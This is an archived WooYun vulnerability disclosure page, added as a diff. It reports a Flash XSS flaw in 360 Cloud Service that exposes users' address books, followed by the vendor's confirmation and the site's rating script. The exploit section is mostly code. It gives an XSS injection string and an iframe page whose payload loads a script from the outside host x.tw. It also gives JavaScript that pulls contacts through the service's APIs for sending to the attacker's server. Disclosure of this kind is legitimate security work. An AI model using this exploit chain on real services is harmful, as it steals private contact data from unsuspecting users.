@@ -1,0 +1,227 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		360云服务存在漏洞可导致用户通讯录泄露  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		360云服务存在漏洞可导致用户通讯录泄露  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/路人甲">路人甲</a> 
+</li><li>提交时间：		2013-10-31 11:35</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-10-31：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-10-31：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-11-10：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-11-20：	细节向普通白帽子公开<br/>
+									2013-11-30：	细节向实习白帽子公开<br/>
+									2013-12-15：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">测试发现，360云服务设计存在缺陷，攻击者可轻易窃取用户通讯录。若以后上线备份照片等功能，则同样可以通过此漏洞轻易窃取到用户照片、视频等。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">360云服务中，注意到有这个功能--复制到剪切板，该功能设计通过flash来实现。<br />
+<br />
+</p><p class="detail"><a href="../images/31101957137ae2d49e586625f2f2fac038f4c69a.jpg" target="_blank"><img src="../images/31101957137ae2d49e586625f2f2fac038f4c69a.jpg" alt="360-1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+找到swf url，反编译：<br />
+<br />
+</p><p class="detail"><a href="../images/3110231032f470fcf20990c72a40ba4f5acdbeab.jpg" target="_blank"><img src="../images/3110231032f470fcf20990c72a40ba4f5acdbeab.jpg" alt="360-2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+一目了然，存在flash xss，构造poc如下，<br />
+<br />
+</p><pre><code>?id=\&quot;))}catch(e){}if(!self.a)self.a=!alert(1)//&amp;width=500&amp;height=500</code></pre><p class='detail'><br />
+<br />
+在cookie中可以看到，该域下的关键cookie T已经httponly，但是，那又怎样？<br />
+<br />
+<br />
+<br />
+构造1.html,将此xss iframe进去，<br />
+<br />
+</p><pre><code>&lt;html&gt;<br />
+  &lt;head&gt;<br />
+    &lt;title&gt;waiting...&lt;/title&gt;<br />
+    &lt;iframe src=&quot;***.swf?id=\%22))}catch(e){a=document.createElement(&#039;script&#039;);a.src=&#039;http://x.tw/x.js&#039;;document.body.appendChild(a);}//&amp;width&amp;height&quot; width=0 height=0&gt;<br />
+    &lt;/iframe&gt;<br />
+    &lt;/head&gt;<br />
+  &lt;body&gt;<br />
+    &lt;h2&gt;exp&lt;/h2&gt;<br />
+  &lt;/body&gt;<br />
+&lt;/html&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+x.js中<br />
+<br />
+通过devicelist、list这两个api获取用户通讯录信息<br />
+<br />
+</p><pre><code>function send(url){<br />
+  var xmlHttp = new XMLHttpRequest();<br />
+  xmlHttp.open(&quot;GET&quot;,url,false);<br />
+  xmlHttp.send();<br />
+  var result = xmlHttp.responseText;<br />
+  var data = eval(&quot;(&quot;+result+&quot;)&quot;);<br />
+  return data;<br />
+}<br />
+var result = send(&quot;/contact/devicelist&quot;);<br />
+var device = result.data.list;<br />
+result = send(&quot;/contact/list?deviceName=&quot; + device);</code></pre><p class='detail'><br />
+<br />
+最后将result发送给攻击者server端。<br />
+<br />
+至此，窃取用户通讯录信息已完成。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">测试账号的通讯录<br />
+<br />
+</p><p class="detail"><a href="../images/311053403362666841bc718c5bd607decb1f0a9f.jpg" target="_blank"><img src="../images/311053403362666841bc718c5bd607decb1f0a9f.jpg" alt="360-3.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+测试用户访问1.html页面后 攻击者拿到测试用户数据<br />
+<br />
+</p><p class="detail"><a href="../images/31105757248efbb5fe1947e6224bfaea004477e5.jpg" target="_blank"><img src="../images/31105757248efbb5fe1947e6224bfaea004477e5.jpg" alt="360-4.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">过滤转义。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/路人甲" title="路人甲">路人甲</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-041569" title="360云服务存在漏洞可导致用户通讯录泄露">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：3 </p>
+													<p class="detail">确认时间：2013-10-31 14:03</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">Flash XSS漏洞已经确认，跟之前反馈的同一个问题。相关技术人员正在处理。感谢您对360安全的支持</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="41569";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
